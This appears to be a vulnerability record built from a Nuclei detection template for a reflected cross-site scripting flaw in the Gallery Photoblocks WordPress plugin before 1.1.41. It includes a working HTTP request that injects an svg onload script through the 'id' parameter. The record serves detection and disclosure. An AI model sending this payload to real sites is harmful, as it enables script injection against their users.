# Vulnerability: Gallery Photoblocks < 1.1.41 - Cross-Site Scripting
**Classification:** CWE-79,CWE-83
**Source:** Nuclei Template (`photoblocks-grid-gallery-xss.yaml`)

## Description
Reflected Cross-Site Scripting (XSS) is a type of web vulnerability where an attacker injects malicious scripts into a website, and the injected code gets reflected back to the user's browser, executing the script in the context of the vulnerable website.

## Secure Mitigation
Fixed in version 1.1.41

## Vulnerable Code Pattern / Exploit Payload
```http
GET /wp-content/plugins/photoblocks-grid-gallery/admin/partials/photoblocks-edit.php?id=%22%3E%3Csvg/onload=alert(document.domain)%3E HTTP/1.1
Host: {{Hostname}}
```

